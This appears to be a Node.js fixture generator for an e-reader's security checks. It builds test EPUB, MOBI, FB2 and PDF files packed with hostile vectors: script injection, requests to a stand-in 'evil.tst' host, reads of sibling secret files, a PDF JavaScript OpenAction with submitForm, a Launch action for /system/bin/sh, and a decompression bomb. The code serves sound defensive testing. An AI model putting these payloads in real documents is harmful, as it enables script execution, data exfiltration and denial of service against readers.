// Crafted books for the gates no Project Gutenberg book covers (ADR-029 Decision 6), into the gitignored
// fixtures/; needs the `zip` CLI.   node fixtures.mjs [siblingsUrl]   → fixtures/tsfonts.epub, fixtures/tshostile.epub,
// and one small book per other format (writeFormatFixtures)
// tsfonts: one font (Source Sans 3, OFL) plain, IDPF- and Adobe-obfuscated. tshostile: see hostileVectors.
import { createHash } from 'node:crypto'
import { execFileSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { crc32, deflateSync } from 'node:zlib'
import { dirname, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { BOOK_ORIGIN } from './bookOrigin.mjs'

const here = dirname(fileURLToPath(import.meta.url))
// On-device defaults (#1228: the page runs under https://appassets.androidplatform.net/, mixed content never
// allowed, no file access). The logging host is https, as sandbox.check.mjs's: an http one would be stopped by
// mixed content before the CSP was ever asked. It needs no server: on the device a request that got past the CSP
// shows in CDP's Network domain (attach as in v2-reader-android-bytes.md). sandbox.check.mjs passes its own.
export const EVIL = 'https://evil.tst:44443'
// The "sibling" files the vectors aim at: beside library.json, outside the two served directories, so a vector
// that got past the CSP still meets the interceptor's 404. (In the served directory itself: sandbox.check.mjs.)
const LOCAL = `${BOOK_ORIGIN}/v2`
const UUID = '2c4a3b8e-5d1f-4e6a-9b7c-0123456789ab'

function epub(out, name, { files, manifest, spine, spineAttrs = '', lang = 'en', encryption, meta = '' }) {
  const dir = mkdtempSync(resolve(tmpdir(), 'tsepub-'))
  const put = (p, data) => { mkdirSync(dirname(resolve(dir, p)), { recursive: true }); writeFileSync(resolve(dir, p), data) }
  put('mimetype', 'application/epub+zip')
  put('META-INF/container.xml', `<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>`)
  if (encryption) put('META-INF/encryption.xml', `<?xml version="1.0"?><encryption xmlns="urn:oasis:names:tc:opendocument:xmlns:container" xmlns:enc="http://www.w3.org/2001/04/xmlenc#">${encryption.map(([alg, uri]) =>
    `<enc:EncryptedData><enc:EncryptionMethod Algorithm="${alg}"/><enc:CipherData><enc:CipherReference URI="${uri}"/></enc:CipherData></enc:EncryptedData>`).join('')}</encryption>`)
  put('OEBPS/content.opf', `<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
<dc:identifier id="uid">urn:uuid:${UUID}</dc:identifier><dc:title>${name}</dc:title><dc:language>${lang}</dc:language><meta property="dcterms:modified">2026-10-29T00:00:00Z</meta>${meta}</metadata>
<manifest><item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>${manifest}</manifest><spine${spineAttrs}>${spine}</spine></package>`)
  put('OEBPS/nav.xhtml', `<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><head><title>nav</title></head><body><nav epub:type="toc"><ol><li><a href="s1.xhtml">One</a></li></ol></nav></body></html>`)
  for (const [p, data] of Object.entries(files)) put(`OEBPS/${p}`, data)
  zipEpub(dir, out)
  rmSync(dir, { recursive: true })
  return out
}

/** `dir` (an unpacked EPUB) into `out`: `mimetype` first and stored, as OCF requires, then the rest. */
export function zipEpub(dir, out) {
  rmSync(out, { force: true })
  // `.`, not the entry names: those come from an untrusted EPUB, and zip reads options anywhere in argv.
  execFileSync('zip', ['-X0q', out, 'mimetype'], { cwd: dir })
  execFileSync('zip', ['-Xr9Dq', out, '.', '-x', 'mimetype'], { cwd: dir })
}

const xhtml = (head, body, attrs = '') => `<?xml version="1.0" encoding="utf-8"?><html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><head><title>s</title>${head}</head><body${attrs}>${body}</body></html>`
const para = 'Sphinx of black quartz, judge my vow. The quick brown fox jumps over the lazy dog. '.repeat(3)

const navOf = (items) => `<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><head><title>nav</title></head><body><nav epub:type="toc"><ol>${items}</ol></nav></body></html>`

const fixtures = resolve(here, 'fixtures')

// OCF obfuscation: XOR the first 1040 (IDPF, key = SHA-1 of the identifier) or 1024 (Adobe, key = UUID bytes) bytes.
const xor = (buf, key, n) => Buffer.from(buf.map((b, i) => (i < n ? b ^ key[i % key.length] : b)))
const idpfKey = createHash('sha1').update(`urn:uuid:${UUID}`).digest()
const adobeKey = Buffer.from(UUID.replaceAll('-', ''), 'hex')

/** Publisher alignment must not defeat an explicit reader choice, on the current or next section. */
export function writeAlignmentEpub(out) {
  const head = '<style>.publisher { text-align:justify !important; font-family:Arial !important }</style>'
  const body = '<p id="plain">Plain paragraph.</p><p class="publisher" id="class">Publisher class.</p>'
    + '<p id="inline" style="text-align:right!important;color:red;font-family:Arial!important">Publisher inline.</p>'
    + '<div id="div" class="publisher">A paragraph in a div.</div>'
  epub(out, 'TS ALIGNMENT', {
    files: Object.fromEntries([1, 2].map((n) => [`s${n}.xhtml`, xhtml(head, `<h1>Alignment ${n}</h1>${body}`)])),
    manifest: [1, 2].map((n) => `<item id="s${n}" href="s${n}.xhtml" media-type="application/xhtml+xml"/>`).join(''),
    spine: '<itemref idref="s1"/><itemref idref="s2"/>',
  })
}

export function writeFontsEpub(out) {
  const font = readFileSync(resolve(here, '../../../apps/mobile/assets/fonts/SourceSans3-Regular.woff2'))
  epub(out, 'tsfonts.epub', {
    files: {
      'fonts/plain.woff2': font,
      'fonts/idpf.woff2': xor(font, idpfKey, 1040),
      'fonts/adobe.woff2': xor(font, adobeKey, 1024),
      'style.css': ['Plain', 'Idpf', 'Adobe'].map((f) => `@font-face { font-family: TS${f}; src: url(fonts/${f.toLowerCase()}.woff2) format("woff2") }`).join('\n')
        + '\n.plain { font-family: TSPlain, serif } .idpf { font-family: TSIdpf, serif } .adobe { font-family: TSAdobe, serif } .fallback { font-family: serif }',
      's1.xhtml': xhtml('<link rel="stylesheet" href="style.css"/>', ['plain', 'idpf', 'adobe', 'fallback']
        // Code keeps its publisher face when a reading font is chosen; CSP/obfuscation checks still exercise book fonts.
        .map((c) => `<h2>${c}</h2><p><code class="${c}"><span id="${c}">${para}</span></code></p>`).join('')),
    },
    manifest: `<item id="css" href="style.css" media-type="text/css"/><item id="s1" href="s1.xhtml" media-type="application/xhtml+xml"/>
<item id="f1" href="fonts/plain.woff2" media-type="font/woff2"/><item id="f2" href="fonts/idpf.woff2" media-type="font/woff2"/><item id="f3" href="fonts/adobe.woff2" media-type="font/woff2"/>`,
    spine: '<itemref idref="s1"/>',
    encryption: [['http://www.idpf.org/2008/embedding', 'OEBPS/fonts/idpf.woff2'], ['http://ns.adobe.com/pdf/enc#RC', 'OEBPS/fonts/adobe.woff2']],
  })
}

// A script's mark: pushed in its own window and, where reachable, in the top one. sandbox.check.mjs reads
// every frame, so a script that ran where it cannot reach top is still seen.
const mark = (v) => `(self.__pwned=self.__pwned||[]).push('${v}');try{(top.__pwned=top.__pwned||[]).push('${v}')}catch(e){}`

/**
 * The hostile book: `[name, observe, stops, markup]` per vector (markup `section` defaults to 1). `observe` is how sandbox.check.mjs sees it
 * get through (`mark`, `request`, `probe`, `sandbox`); `stops` is the CSP mutation that must then catch it,
 * null for a blind spot (README, Sandbox). `data-ts-click` elements are clicked by the check.
 */
export const hostileVectors = (evil, siblings) => {
  const at = (name, ext = '') => `${evil}/${name}${ext}`
  return [
    // Book scripts: foliate's iframes allow scripts, so the nonce is the only barrier.
    ['inline-script', 'mark', 'script-src', { head: `<script>${mark('inline-script')}</script>` }],
    ['script-src-in-zip', 'mark', 'script-src blob:', { head: '<script src="evil.js"></script>', files: { 'evil.js': mark('script-src-in-zip') } }],
    ['body-onload', 'mark', 'script-src', { bodyAttrs: ` onload="${mark('body-onload')}"` }],
    ['img-onerror', 'mark', 'script-src', { body: `<img src="missing.png" onerror="${mark('img-onerror')}" alt=""/>` }],
    ['svg-inline-script', 'mark', 'script-src', { body: `<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><script>${mark('svg-inline-script')}</script></svg>` }],
    ['svg-file-script', 'mark', null, {
      body: '<object data="evil.svg" type="image/svg+xml" width="10" height="10"></object><embed src="evil.svg" type="image/svg+xml" width="10" height="10"/>',
      files: { 'evil.svg': `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><script>${mark('svg-file-script')}</script></svg>` },
    }],
    ['srcdoc-script', 'mark', 'script-src', { body: `<iframe width="10" height="10" srcdoc="&lt;script&gt;${mark('srcdoc-script')}&lt;/script&gt;"></iframe>` }],
    // Also an escape if it reaches the host as openLink (#1066).
    ['javascript-url', 'mark', null, { body: `<p><a data-ts-click="" href="javascript:${mark('javascript-url')}">javascript: link</a></p>` }],
    // The retained EPUB's own directory: reachable only if the page could read file:// (it cannot: its origin is https, ADR-029 Decision 4).
    ['file-sibling-xhr', 'mark', 'script-src', { head: `<script>try{var x=new XMLHttpRequest();x.open('GET','${siblings}/secret.json',false);x.send();if(/ts-sibling-secret/.test(x.responseText)){${mark('file-sibling-xhr')}}}catch(e){}</script>` }],
    ['file-sibling-img', 'probe', 'img-src', { body: `<img id="file-sibling-img" src="${siblings}/secret.png" alt=""/>` }],
    ['file-sibling-css', 'probe', 'style-src', { head: `<link rel="stylesheet" href="${siblings}/secret.css"/>`, body: '<p id="file-sibling-css">styled by a sibling file?</p>' }],
    ['file-sibling-iframe', 'probe', 'frame-src', { body: `<iframe src="${siblings}/secret.json" width="10" height="10"></iframe>` }],
    ['base-href', 'probe', 'base-uri', { head: `<base href="${at('base-href/')}"/>`, body: '<img src="base-href.png" alt=""/>' }],
    // page.mjs strips refresh metas; the probe sees one that survived. The entity row has a section whose
    // source never spells "refresh". foliate (this pin) re-serializes a section before the page sees it, which
    // decodes the entity; the row holds the line if it ever stops doing so.
    ['meta-refresh', 'probe', null, { head: `<meta http-equiv="refresh" content="1;url=${at('meta-refresh')}"/>` }],
    ['meta-refresh-entity', 'probe', null, { section: 2, head: `<meta http-equiv="&#x72;efresh" content="1;url=${at('meta-&#x72;efresh-entity')}"/>` }],
    // Requests out of the book.
    ['link-stylesheet', 'request', 'style-src', { head: `<link rel="stylesheet" href="${at('link-stylesheet', '.css')}"/>` }],
    ['link-prefetch', 'request', 'default-src', { head: `<link rel="prefetch" href="${at('link-prefetch')}"/>` }],
    ['css-import', 'request', 'style-src', { head: `<style>@import url("${at('css-import', '.css')}");</style>` }],
    ['css-font', 'request', 'font-src', { head: `<style>@font-face { font-family: TsExt; src: url("${at('css-font', '.woff2')}") } h1 { font-family: TsExt }</style>` }],
    ['css-background', 'request', 'img-src', { head: `<style>h1 { background: url("${at('css-background', '.png')}") }</style>` }],
    ['img', 'request', 'img-src', { body: `<img src="${at('img', '.png')}" alt=""/>` }],
    ['img-srcset', 'request', 'img-src', { body: `<img srcset="${at('img-srcset', '.png')} 1x" alt=""/>` }],
    ['svg-image', 'request', 'img-src', { body: `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><image href="${at('svg-image', '.png')}" width="10" height="10"/></svg>` }],
    ['audio', 'request', 'media-src', { body: `<audio src="${at('audio', '.mp3')}" autoplay="autoplay"></audio>` }],
    ['video-poster', 'request', 'img-src', { body: `<video poster="${at('video-poster', '.png')}" width="10" height="10"></video>` }],
    ['iframe', 'request', 'frame-src', { body: `<iframe src="${at('iframe')}" width="10" height="10"></iframe>` }],
    ['object', 'request', null, { body: `<object data="${at('object')}" width="10" height="10"></object>` }],
    ['embed', 'request', null, { body: `<embed src="${at('embed')}" width="10" height="10"/>` }],
    ['form', 'sandbox', null, { body: `<form action="${at('form')}" method="get"><input name="q" value="x"/><button data-ts-click="" type="submit">send</button></form>` }],
    // foliate hands an external link to the host (`openLink`); the page itself never navigates.
    ['link-tap', 'request', null, { body: `<p><a data-ts-click="" href="${at('link-tap')}">external link</a></p>` }],
    // FB2 (#1128): foliate rebuilds its sections from whitelisted elements, so no script, style, frame or
    // meta of the book survives; what does is an image or link address. `fb2` is section markup.
    // (An FB2 declaring any entity, external or not, is refused before parsing: formats.mjs checkFb2,
    // covered by formats.check.mjs.)
    ['fb2-image', 'request', 'img-src', { fb2: `<image l:href="${at('fb2-image', '.png')}"/>` }],
  ]
}

/** Which hostile books carry a vector: zip-only files → EPUB; FB2 markup → FB2; plain HTML → EPUB and MOBI (MOBI6 is HTML). */
export const formatsOf = ([, , , v]) => (v.fb2 ? ['fb2'] : v.files ? ['epub'] : ['epub', 'mobi'])

/** The HTML vectors of `format`, by section: `part(n, 'head' | 'body' | 'bodyAttrs')`. */
function hostileParts(format, siblings, evil) {
  const markups = hostileVectors(evil, siblings).filter((r) => formatsOf(r).includes(format)).map(([, , , v]) => v)
  const sections = [...new Set(markups.map((v) => v.section ?? 1))]
  const part = (n, key) => markups.filter((v) => (v.section ?? 1) === n).map((v) => v[key] ?? '').filter(Boolean).join('\n')
  const body = (n) => `<h1 id="ts-hostile">Hostile</h1><p>${para}</p>\n${part(n, 'body')}\n<p>${para}</p>`
  return { markups, sections, part, body }
}

export function writeHostileEpub(out, siblings = LOCAL, evil = EVIL) {
  const { markups, sections, part, body } = hostileParts('epub', siblings, evil)
  const section = (n) => xhtml(part(n, 'head'), body(n), part(n, 'bodyAttrs'))
  const files = Object.assign({}, ...markups.map((v) => v.files))
  const items = Object.keys(files).map((f, i) => `<item id="r${i}" href="${f}" media-type="${f.endsWith('.js') ? 'application/javascript' : 'image/svg+xml'}"/>`).join('')
  // #1426: a description that is HTML with script in it; `describe` must hand it over as text, nothing run.
  const description = `<p>Hostile <img src="missing.png" onerror="${mark('description-html')}"><script>${mark('description-html')}</script></p>`
  return epub(out, 'tshostile.epub', {
    meta: `<dc:description>${description.replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;').replaceAll('"', '&quot;')}</dc:description>`,
    files: { ...files, ...Object.fromEntries(sections.map((n) => [`s${n}.xhtml`, section(n)])) },
    manifest: sections.map((n) => `<item id="s${n}" href="s${n}.xhtml" media-type="application/xhtml+xml" properties="scripted svg"/>`).join('') + items,
    spine: sections.map((n) => `<itemref idref="s${n}"/>`).join(''),
  })
}

/** The EPUB's HTML vectors as a MOBI6, one HTML document per section split by `<mbp:pagebreak/>` (foliate's MOBI6 section rule). */
export function writeHostileMobi(out, siblings = LOCAL, evil = EVIL) {
  const { sections, part, body } = hostileParts('mobi', siblings, evil)
  const html = sections.map((n) => `<html><head>${part(n, 'head')}</head><body${part(n, 'bodyAttrs')}>${body(n)}</body></html>`).join('<mbp:pagebreak/>')
  writeFileSync(out, mobi('tshostile', html))
  return out
}

/** The FB2 vectors in one section; its id survives foliate's conversion, so the check can tell the book's frame. */
export function writeHostileFb2(out, evil = EVIL) {
  const rows = hostileVectors(evil, LOCAL).filter((r) => formatsOf(r).includes('fb2')).map(([, , , v]) => v)
  writeFileSync(out, fb2('tshostile', `<section id="ts-hostile"><title><p>Hostile</p></title><p>${para}</p>${rows.map((v) => v.fb2).join('\n')}<p>${para}</p></section>`))
  return out
}

// The other formats (#1128), each the smallest file its foliate reader opens. No public-domain sample is
// vendored: every byte is written here, so each one's shape is visible and nothing needs a licence.

/**
 * A MOBI6 file: PDB header, record 0 (PalmDOC header, uncompressed, + a 232-byte MOBI header, UTF-8,
 * no EXTH, no NCX), then the text in 4096-byte records. `encryption` 2 is Mobipocket DRM: the header
 * flag alone, which is all the page reads before it refuses. KF8/AZW3 shares this container and flag:
 * `version` 8 is the header of one (nothing else of KF8 is written: no SKEL/FRAG index, so the page refuses it
 * as damaged; real KF8 books are synthetic/). `boundary` adds an EXTH with record 121, the KF8 half of a
 * MOBI/KF8 combo (here a record that holds no MOBI header, so foliate reads the MOBI6 half).
 * @param {string} title
 * @param {string} html
 * @param {{ encryption?: number, version?: number, boundary?: number }} [options]
 */
export function mobi(title, html, { encryption = 0, version = 6, boundary } = {}) {
  const text = Buffer.from(html, 'utf8')
  const SIZE = 4096
  const records = []
  for (let at = 0; at < text.length; at += SIZE) records.push(text.subarray(at, at + SIZE))
  const exth = boundary === undefined ? Buffer.alloc(0) : Buffer.alloc(24)
  if (exth.length) {
    exth.write('EXTH', 0, 'latin1')
    exth.writeUInt32BE(24, 4)
    exth.writeUInt32BE(1, 8)
    exth.writeUInt32BE(121, 12)
    exth.writeUInt32BE(12, 16)
    exth.writeUInt32BE(boundary, 20)
  }
  const name = Buffer.from(title, 'utf8')
  const r0 = Buffer.alloc(248 + exth.length + name.length + 4)
  exth.copy(r0, 248)
  if (exth.length) r0.writeUInt32BE(0x40, 128)  // EXTH present
  r0.writeUInt16BE(1, 0)                        // compression: none
  r0.writeUInt32BE(text.length, 4)
  r0.writeUInt16BE(records.length, 8)
  r0.writeUInt16BE(SIZE, 10)
  r0.writeUInt16BE(encryption, 12)
  r0.write('MOBI', 16, 'latin1')
  r0.writeUInt32BE(232, 20)                     // MOBI header length
  r0.writeUInt32BE(2, 24)                       // type: book
  r0.writeUInt32BE(65001, 28)                   // UTF-8
  r0.writeUInt32BE(0x1128, 32)                  // uid
  r0.writeUInt32BE(version, 36)                 // 6: MOBI6; 8: KF8
  r0.writeUInt32BE(records.length + 1, 80)      // first non-text record
  r0.writeUInt32BE(248 + exth.length, 84)       // full title: offset, length
  r0.writeUInt32BE(name.length, 88)
  r0.writeUInt32BE(9, 92)                       // locale: English
  r0.writeUInt32BE(records.length + 1, 108)     // first resource: there are none
  r0.writeUInt32BE(0xffffffff, 244)             // no NCX index
  name.copy(r0, 248 + exth.length)
  const all = [r0, ...records]
  const pdb = Buffer.alloc(78 + all.length * 8 + 2)
  pdb.write(title.slice(0, 31), 0, 'latin1')
  pdb.write('BOOKMOBI', 60, 'latin1')
  pdb.writeUInt16BE(all.length, 76)
  let offset = pdb.length
  all.forEach((r, i) => { pdb.writeUInt32BE(offset, 78 + i * 8); pdb.writeUInt32BE(i, 78 + i * 8 + 4); offset += r.length })
  return Buffer.concat([pdb, ...all])
}

/** An FB2 (XML) whose first body is `body` (FB2 markup), after an optional `doctype`. */
export const fb2 = (title, body, doctype = '') => `<?xml version="1.0" encoding="utf-8"?>${doctype}
<FictionBook xmlns="http://www.gribuser.ru/xml/fictionbook/2.0" xmlns:l="http://www.w3.org/1999/xlink">
<description><title-info><author><first-name>Test</first-name><last-name>Author</last-name></author><book-title>${title}</book-title><lang>en</lang></title-info></description>
<body>${body}</body>
</FictionBook>`

/** An FB2 section: a title and one `<p>` per paragraph. */
const fb2Section = (title, ps) => `<section><title><p>${title}</p></title>${ps.map((p) => `<p>${p}</p>`).join('')}</section>`

/** A solid-colour RGB PNG, w×h: a comic page foliate's CBZ reader renders as an image. */
export function png(w, h, [r, g, b]) {
  const chunk = (type, data) => {
    const len = Buffer.alloc(4)
    len.writeUInt32BE(data.length)
    const body = Buffer.concat([Buffer.from(type, 'latin1'), data])
    const crc = Buffer.alloc(4)
    crc.writeUInt32BE(crc32(body))
    return Buffer.concat([len, body, crc])
  }
  const ihdr = Buffer.alloc(13)
  ihdr.writeUInt32BE(w, 0)
  ihdr.writeUInt32BE(h, 4)
  ihdr.set([8, 2, 0, 0, 0], 8)                  // 8-bit RGB
  const row = Buffer.concat([Buffer.from([0]), Buffer.from(Array.from({ length: w }, () => [r, g, b]).flat())])
  return Buffer.concat([Buffer.from('89504e470d0a1a0a', 'hex'), chunk('IHDR', ihdr), chunk('IDAT', deflateSync(Buffer.concat(Array(h).fill(row)))), chunk('IEND', Buffer.alloc(0))])
}

/** `files` ({ name: bytes }) zipped into `out` (a CBZ, an FBZ). */
function zipFiles(out, files) {
  const dir = mkdtempSync(resolve(tmpdir(), 'tszip-'))
  for (const [p, data] of Object.entries(files)) writeFileSync(resolve(dir, p), data)
  rmSync(out, { force: true })
  execFileSync('zip', ['-Xr9Dq', out, '.'], { cwd: dir })
  rmSync(dir, { recursive: true })
  return out
}

const prose = (n) => Array.from({ length: n }, (_, i) => `Paragraph ${i + 1}. ${para}`)

/**
 * A PDF written by hand (#1128 S5): `pages` text pages (Helvetica, not embedded), each saying
 * "Page N. Sphinx…". `annots[i]` (raw dictionaries) go on page i+1 as link annotations, `openAction` (a
 * raw action dictionary) runs on open in a reader that runs actions. `cjk`: one Type0 font on the
 * predefined UniGB-UCS2-H cMap, not embedded (without pdf.js's cMaps its text neither draws nor extracts).
 * `locked`: a Standard security handler whose /U no empty password matches (opening needs a password).
 * `jpx`: a JPEG 2000 codestream drawn at 200×200 pt on each page (pdf.js decodes it with OpenJPEG's wasm).
 * `metadata`: the catalog's XMP stream, `{ filter, bytes }` raw (pdf.js decodes it whole while opening).
 * `contents`: `{ [page]: { filter, bytes } }`, raw content streams in place of those pages' text (decoded when drawn).
 * Offsets computed, so the xref is real; binary stream bytes ride as latin1.
 */
export function pdf(pages, { title = 'TS PDF', annots = [], openAction = '', cjk = false, locked = false, lines = null, outline = [], jpx = null, metadata = null, contents = {} } = {}) {
  const objs = []
  const add = (body) => objs.push(body) && objs.length
  const catalog = add('')
  const tree = add('')
  const font = cjk
    ? add(`<< /Type /Font /Subtype /Type0 /BaseFont /STSong-Light /Encoding /UniGB-UCS2-H /DescendantFonts [${objs.length + 2} 0 R] >>`)
    : add('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>')
  if (cjk) {
    add(`<< /Type /Font /Subtype /CIDFontType0 /BaseFont /STSong-Light /CIDSystemInfo << /Registry (Adobe) /Ordering (GB1) /Supplement 4 >> /FontDescriptor ${objs.length + 2} 0 R >>`)
    add('<< /Type /FontDescriptor /FontName /STSong-Light /Flags 6 /FontBBox [0 -200 1000 900] /ItalicAngle 0 /Ascent 880 /Descent -120 /CapHeight 880 /StemV 93 >>')
  }
  const stream = (dict, data) => {
    const bytes = typeof data === 'string' ? Buffer.from(data, 'latin1') : Buffer.from(data)
    return `<<${dict ? ` ${dict}` : ''} /Length ${bytes.length} >>\nstream\n${bytes.toString('latin1')}\nendstream`
  }
  const image = jpx && add(stream('/Type /XObject /Subtype /Image /Width 16 /Height 16 /Filter /JPXDecode', jpx))
  const kids = []
  for (let n = 1; n <= pages; n++) {
    // CJK: U+4E2D U+6587 as UCS-2 code units.
    const text = cjk ? 'BT /F1 28 Tf 40 760 Td <4E2D6587> Tj ET'
      : `BT /F1 14 Tf 40 760 Td ${(lines ?? [`Page ${n}. Sphinx of black quartz, judge my vow.`, 'The quick brown fox jumps over the lazy dog.']).map((l) => `(${l}) Tj`).join(' 0 -20 Td ')} ET`
    const content = add(contents[n] ? stream(`/Filter ${contents[n].filter}`, contents[n].bytes) : stream('', image ? `${text} q 200 0 0 200 40 300 cm /Im1 Do Q` : text))
    const annotRefs = (annots[n - 1] ?? []).map((a) => `${add(a)} 0 R`)
    kids.push(add(`<< /Type /Page /Parent ${tree} 0 R /MediaBox [0 0 600 800] /Resources << /Font << /F1 ${font} 0 R >>${image ? ` /XObject << /Im1 ${image} 0 R >>` : ''} >> /Contents ${content} 0 R${annotRefs.length ? ` /Annots [${annotRefs.join(' ')}]` : ''} >>`))
  }
  objs[tree - 1] = `<< /Type /Pages /Kids [${kids.map((k) => `${k} 0 R`).join(' ')}] /Count ${pages} >>`
  // `outline`: [{ title, dest: (pageRefs) => raw destination }], one flat level.
  let outlines = 0
  if (outline.length) {
    outlines = add('')
    const ids = outline.map(() => add(''))
    ids.forEach((id, i) => {
      objs[id - 1] = `<< /Title (${outline[i].title}) /Parent ${outlines} 0 R${i ? ` /Prev ${ids[i - 1]} 0 R` : ''}${i < ids.length - 1 ? ` /Next ${ids[i + 1]} 0 R` : ''} /Dest ${outline[i].dest(kids.map((k) => `${k} 0 R`))} >>`
    })
    objs[outlines - 1] = `<< /Type /Outlines /First ${ids[0]} 0 R /Last ${ids.at(-1)} 0 R /Count ${ids.length} >>`
  }
  const xmp = metadata && add(stream(`/Type /Metadata /Subtype /XML /Filter ${metadata.filter}`, metadata.bytes))
  objs[catalog - 1] = `<< /Type /Catalog /Pages ${tree} 0 R${outlines ? ` /Outlines ${outlines} 0 R` : ''}${openAction ? ` /OpenAction ${openAction}` : ''}${xmp ? ` /Metadata ${xmp} 0 R` : ''} >>`
  const info = add(`<< /Title (${title}) /Author (Test Author) >>`)
  const encrypt = locked ? add(`<< /Filter /Standard /V 1 /R 2 /O <${'5a'.repeat(32)}> /U <${'a5'.repeat(32)}> /P -4 >>`) : 0
  let out = '%PDF-1.4\n'
  const offsets = objs.map((body, i) => { const at = out.length; out += `${i + 1} 0 obj\n${body}\nendobj\n`; return at })
  const xref = out.length
  out += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n${offsets.map((o) => `${String(o).padStart(10, '0')} 00000 n \n`).join('')}`
  const locks = encrypt ? ` /Encrypt ${encrypt} 0 R /ID [<${'00'.repeat(16)}> <${'00'.repeat(16)}>]` : ''
  out += `trailer\n<< /Size ${objs.length + 1} /Root ${catalog} 0 R /Info ${info} 0 R${locks} >>\nstartxref\n${xref}\n%%EOF\n`
  return Buffer.from(out, 'latin1')
}

/**
 * #1204: a JPEG 2000 image, 16×16 of rgb(200, 30, 40), lossless. Made once with OpenJPEG 2.5.3 (its comment marker says
 * so): `opj_compress -i red.ppm -o red.j2k -n 1`, red.ppm a 16×16 P6 of that colour. 229 bytes; no encoder is needed to
 * run the checks.
 */
export const RED_J2K = Buffer.from('/0//UQAvAAAAAAAQAAAAEAAAAAAAAAAAAAAAEAAAABAAAAAAAAAAAAADBwEBBwEBBwEB/1IADAAAAAEBAAQEAAH/XAAEQED/ZAAlAAFDcmVhdGVkIGJ5IE9wZW5KUEVHIHZlcnNpb24gMi41LjP/kAAKAAAAAAB1AAH/k8fUPhFQVK/fR7K3AAAAAGEhL9rEQAAAwkJftpkAAAGEhL/B8g8UAFyv9JywPAAAAABhIS/fgYAUAFyv9JywPAAAAABhIS/axEAAAMJCX7aZAAABhIS/bTIAAAMJCX7aZAAABhIS/3//2Q==', 'base64')

/**
 * #1204: a decompression bomb, 2 KB on disk: its XMP metadata is 1 GiB of zeros deflated twice
 * (`/Filter [/FlateDecode /FlateDecode]`), which pdf.js inflates whole while opening (3.5 s on a desktop Chromium).
 * Making it takes 1.5 s and 1 GiB of memory.
 */
let bombBytes = null
const bomb = () => ({ filter: '[/FlateDecode /FlateDecode]', bytes: bombBytes ??= deflateSync(deflateSync(Buffer.alloc(1 << 30), { level: 9 }), { level: 9 }) })
export const bombPdf = () => pdf(1, { title: 'TS BOMB', metadata: bomb() })
/** #1204: the same bomb as page 2's content: the PDF opens, and that page never finishes drawing. */
export const bombPagePdf = () => pdf(2, { title: 'TS BOMB PAGE', contents: { 2: bomb() } })

/**
 * The hostile PDF (#1128 S5): every way a PDF asks a reader to run script or leave the file. A JavaScript
 * OpenAction and a JavaScript link (pdf.js runs PDF scripts only in its scripting sandbox, never shipped
 * here), a `javascript:` URI, a Launch action, a GoToR to a file at `evil`, and an http URI link (the one the
 * page may hand the host as `openLink`, never navigate to). Rects: page 1, one row of links per vector.
 */
export function hostilePdf(evil) {
  const js = `(window.top.__pwned = 1; this.submitForm("${evil}/js"))`
  const link = (y, action) => `<< /Type /Annot /Subtype /Link /Rect [40 ${y} 560 ${y + 20}] /Border [0 0 0] /A ${action} >>`
  return pdf(2, {
    title: 'TS HOSTILE PDF',
    openAction: `<< /S /JavaScript /JS ${js} >>`,
    annots: [[
      link(700, `<< /S /JavaScript /JS ${js} >>`),
      link(660, '<< /S /URI /URI (javascript:window.top.__pwned=1) >>'),
      link(620, '<< /S /Launch /F (/system/bin/sh) >>'),
      link(580, `<< /S /GoToR /F (${evil}/gotor.pdf) /D [0 /Fit] >>`),
      link(540, `<< /S /URI /URI (${evil}/uri) >>`),
    ]],
  })
}

/**
 * #1265: the lightbox's book. An `<img>` with alt text (1600×1000: larger than a phone or laptop screen, so a zoomed
 * one has room to pan) and an SVG `<image>` with a `<title>`, each between paragraphs on the first page, then prose,
 * then a last `<img>` at the section's end. The format check's tsimage.epub, and (committed) apps/web/e2e/fixtures/v2-image.epub:
 *   node -e "import('./fixtures.mjs').then((f) => f.writeImageEpub(require('path').resolve('../../../apps/web/e2e/fixtures/v2-image.epub')))"
 */
export function writeImageEpub(out, name = 'TS IMAGE') {
  return epub(out, name, {
    files: {
      'red.png': png(1600, 1000, [200, 40, 40]),
      'blue.png': png(240, 160, [40, 40, 200]),
      'green.png': png(240, 160, [40, 200, 40]),
      's1.xhtml': xhtml('', `<p>${prose(1)[0]}</p><p style="text-align:center"><img src="red.png" alt="A red square" style="width:60%"/></p>`
        + `<p>${para}</p><p style="text-align:center"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="240" height="160" viewBox="0 0 240 160">`
        + `<title>A blue square</title><image xlink:href="blue.png" width="240" height="160"/></svg></p>${prose(20).map((p) => `<p>${p}</p>`).join('')}`
        + '<p style="text-align:center"><img src="green.png" alt="A green square" style="width:30%"/></p>'),
    },
    manifest: '<item id="s1" href="s1.xhtml" media-type="application/xhtml+xml" properties="svg"/><item id="red" href="red.png" media-type="image/png"/><item id="blue" href="blue.png" media-type="image/png"/><item id="green" href="green.png" media-type="image/png"/>',
    spine: '<itemref idref="s1"/>',
  })
}

